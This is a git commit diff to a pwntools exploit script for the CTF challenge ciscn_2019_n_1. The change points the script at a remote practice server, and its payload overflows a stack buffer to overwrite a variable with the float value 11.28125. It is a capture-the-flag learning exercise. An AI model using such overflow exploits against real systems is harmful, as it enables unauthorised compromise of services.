92cc22bf12124ec9981c455492276c31001687c2
fanxinli <fanxin_li@qq.com>
2021-07-23 17:39:41 +0800

    modified page1/ciscn_2019_n_1/wp_two.py

--- page1/ciscn_2019_n_1/wp_two.py
+++ page1/ciscn_2019_n_1/wp_two.py
@@ -3,12 +3,11 @@
 from pwn import *
 
 
-p = process("./ciscn_2019_n_1")
-# p = remote("node4.buuoj.cn", 26553)
+#p = process("./ciscn_2019_n_1")
+p = remote("node4.buuoj.cn", 26553)
 
 # cover ```v2``` to ```11.28125```
 payload = cyclic(0x30-0x4)+p32(0x41348000)
-pause()
 p.sendline(payload)
 
 p.interactive()
